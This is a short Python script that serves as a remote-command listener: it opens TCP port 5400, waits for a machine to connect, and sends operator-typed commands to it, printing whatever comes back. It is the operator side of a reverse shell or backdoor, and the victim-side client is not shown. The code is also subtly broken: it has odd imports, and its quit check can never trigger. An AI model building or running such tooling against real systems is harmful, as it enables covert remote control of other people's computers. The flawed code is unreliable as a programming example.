from distutils.cmd import Command
from pickle import TRUE
import socket
import os

Host = ''
Puerto = 5400

Sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ConexiÃ³n mediante ip y tcp

Sock.bind((Host,Puerto))

Sock.listen(5)
print ("Waiting for connections "+ str(Puerto)) 

def connections():
    CN,AD = Sock.accept()
    print ("Connected to "+ AD[0]) 
    Commands(CN)
    CN.close()

def Commands(CN):
    while TRUE:
        Com = input("Command> ")
        if str.encode(Com) == 'q':break
        if len(str.encode(Com)) >0:
            CN.send(str.encode(Com))
            X = str(CN.recv(1024))
            os.system('cls')
            print(X)

connections()


